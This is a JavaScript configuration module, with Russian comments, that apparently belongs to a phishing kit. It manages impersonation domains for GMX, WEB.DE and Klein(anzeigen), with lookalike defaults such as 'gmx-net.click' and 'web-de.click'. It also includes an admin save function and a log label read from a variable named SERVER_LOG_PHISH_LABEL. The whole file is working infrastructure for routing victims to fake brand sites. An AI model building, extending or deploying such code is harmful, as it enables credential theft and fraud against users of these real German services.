'use strict';

/**
 * Домены брендов GMX / WEB.DE / Klein: базово из .env, при наличии data/brand-domains.json — поверх.
 * Списки хостов — мутабельные массивы (стабильные ссылки для ROUTE_HTTP_DEPS / gate).
 */

const fs = require('fs');
const path = require('path');
const { DATA_DIR } = require('../core/bootstrap');

const FILE = path.join(DATA_DIR, 'brand-domains.json');

const GMX_DOMAINS_LIST = [];
const WEBDE_DOMAINS_LIST = [];
const KLEIN_DOMAINS_LIST = [];

const scalars = {
  gmxDomain: '',
  gmxDomainsRaw: '',
  gmxCanonicalHost: '',
  webdeDomain: '',
  webdeDomainsRaw: '',
  webdeCanonicalHost: '',
  kleinDomain: '',
  kleinDomainsRaw: '',
  kleinCanonicalHost: ''
};

let brandsRef = null;

function setBrandsRef(b) {
  brandsRef = b;
}

function normHost(d) {
  return String(d == null ? '' : d)
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, '')
    .split('/')[0]
    .trim();
}

function parseListFromCsv(csv, singleFallback) {
  const r = String(csv || '').trim();
  if (r) {
    return r.split(',').map(normHost).filter(Boolean);
  }
  const s = normHost(singleFallback);
  if (!s) return [];
  return [s, 'www.' + s];
}

function computeSnapshot(gmxDomain, gmxCsv, webdeDomain, webdeCsv, kleinDomain, kleinCsv) {
  const gd = normHost(gmxDomain) || 'gmx-net.click';
  const gList = parseListFromCsv(gmxCsv, gd);
  const gCanon = (gList[0] || gd).replace(/^www\./, '') || gd;

  const wd = normHost(webdeDomain) || 'web-de.click';
  const wList = parseListFromCsv(webdeCsv, wd);
  const wCanon = (wList[0] || wd).replace(/^www\./, '') || wd;

  const kd = normHost(kleinDomain) || 'choigamevi.com';
  const kList = parseListFromCsv(kleinCsv, kd);
  const kCanon = kd.replace(/^www\./, '');

  return {
    gmxDomain: gd,
    gmxDomainsRaw: gList.join(','),
    gmxCanonicalHost: gCanon,
    gmxList: gList,
    webdeDomain: wd,
    webdeDomainsRaw: wList.join(','),
    webdeCanonicalHost: wCanon,
    webdeList: wList,
    kleinDomain: kd,
    kleinDomainsRaw: kList.join(','),
    kleinCanonicalHost: kCanon,
    kleinList: kList
  };
}

function readEnvSnapshot() {
  return computeSnapshot(
    process.env.GMX_DOMAIN || 'gmx-net.click',
    (process.env.GMX_DOMAINS || '').trim(),
    process.env.WEBDE_DOMAIN || 'web-de.click',
    (process.env.WEBDE_DOMAINS || '').trim(),
    process.env.KLEIN_DOMAIN || 'choigamevi.com',
    (process.env.KLEIN_DOMAINS || '').trim()
  );
}

function readFileSnapshot(base) {
  if (!fs.existsSync(FILE)) return base;
  let j;
  try {
    j = JSON.parse(fs.readFileSync(FILE, 'utf8'));
  } catch (e) {
    return base;
  }
  if (!j || typeof j !== 'object') return base;

  const gmxDomain = j.gmxDomain != null && String(j.gmxDomain).trim() !== '' ? normHost(j.gmxDomain) : base.gmxDomain;
  const gmxCsv = j.gmxDomains != null ? String(j.gmxDomains).trim() : base.gmxDomainsRaw;
  const webdeDomain = j.webdeDomain != null && String(j.webdeDomain).trim() !== '' ? normHost(j.webdeDomain) : base.webdeDomain;
  const webdeCsv = j.webdeDomains != null ? String(j.webdeDomains).trim() : base.webdeDomainsRaw;
  const kleinDomain = j.kleinDomain != null && String(j.kleinDomain).trim() !== '' ? normHost(j.kleinDomain) : base.kleinDomain;
  const kleinCsv = j.kleinDomains != null ? String(j.kleinDomains).trim() : base.kleinDomainsRaw;

  return computeSnapshot(gmxDomain, gmxCsv, webdeDomain, webdeCsv, kleinDomain, kleinCsv);
}

function mergeSnapshot() {
  return readFileSnapshot(readEnvSnapshot());
}

function replaceArr(target, items) {
  target.length = 0;
  for (let i = 0; i < items.length; i++) target.push(items[i]);
}

function applySnapshot(snap) {
  scalars.gmxDomain = snap.gmxDomain;
  scalars.gmxDomainsRaw = snap.gmxDomainsRaw;
  scalars.gmxCanonicalHost = snap.gmxCanonicalHost;
  scalars.webdeDomain = snap.webdeDomain;
  scalars.webdeDomainsRaw = snap.webdeDomainsRaw;
  scalars.webdeCanonicalHost = snap.webdeCanonicalHost;
  scalars.kleinDomain = snap.kleinDomain;
  scalars.kleinDomainsRaw = snap.kleinDomainsRaw;
  scalars.kleinCanonicalHost = snap.kleinCanonicalHost;

  replaceArr(GMX_DOMAINS_LIST, snap.gmxList);
  replaceArr(WEBDE_DOMAINS_LIST, snap.webdeList);
  replaceArr(KLEIN_DOMAINS_LIST, snap.kleinList);

  if (brandsRef && brandsRef.gmx) {
    brandsRef.gmx.canonicalHost = snap.gmxCanonicalHost;
    brandsRef.webde.canonicalHost = snap.webdeCanonicalHost;
    brandsRef.klein.canonicalHost = snap.kleinCanonicalHost;
  }
}

function reload() {
  applySnapshot(mergeSnapshot());
}

function getServerLogPhishLabel() {
  const env = (process.env.SERVER_LOG_PHISH_LABEL || '').trim();
  if (env) return env;
  const v = scalars.webdeDomain || 'сайт';
  return v || 'сайт';
}

function saveFromAdmin(body) {
  const gmxDomain = normHost(body && body.gmxDomain);
  const webdeDomain = normHost(body && body.webdeDomain);
  const kleinDomain = normHost(body && body.kleinDomain);
  if (!gmxDomain || !webdeDomain || !kleinDomain) {
    const err = new Error('Укажите основной домен для GMX, WEB.DE и Klein');
    err.statusCode = 400;
    throw err;
  }
  let gmxCsv = String((body && body.gmxDomains) || '').trim();
  let webdeCsv = String((body && body.webdeDomains) || '').trim();
  let kleinCsv = String((body && body.kleinDomains) || '').trim();

  if (!gmxCsv) gmxCsv = [gmxDomain, 'www.' + gmxDomain].join(',');
  if (!webdeCsv) webdeCsv = [webdeDomain, 'www.' + webdeDomain].join(',');
  if (!kleinCsv) kleinCsv = [kleinDomain, 'www.' + kleinDomain].join(',');

  const snap = computeSnapshot(gmxDomain, gmxCsv, webdeDomain, webdeCsv, kleinDomain, kleinCsv);

  const doc = {
    gmxDomain: snap.gmxDomain,
    gmxDomains: snap.gmxDomainsRaw,
    webdeDomain: snap.webdeDomain,
    webdeDomains: snap.webdeDomainsRaw,
    kleinDomain: snap.kleinDomain,
    kleinDomains: snap.kleinDomainsRaw
  };

  fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.writeFileSync(FILE, JSON.stringify(doc, null, 2), 'utf8');
  applySnapshot(snap);
}

function clearFileAndReload() {
  try {
    if (fs.existsSync(FILE)) fs.unlinkSync(FILE);
  } catch (e) {}
  reload();
}

function getApiPayload() {
  return {
    gmxDomain: scalars.gmxDomain,
    gmxDomains: scalars.gmxDomainsRaw,
    webdeDomain: scalars.webdeDomain,
    webdeDomains: scalars.webdeDomainsRaw,
    kleinDomain: scalars.kleinDomain,
    kleinDomains: scalars.kleinDomainsRaw,
    overridesFile: fs.existsSync(FILE)
  };
}

module.exports = {
  scalars,
  GMX_DOMAINS_LIST,
  WEBDE_DOMAINS_LIST,
  KLEIN_DOMAINS_LIST,
  setBrandsRef,
  reload,
  getServerLogPhishLabel,
  saveFromAdmin,
  clearFileAndReload,
  getApiPayload
};
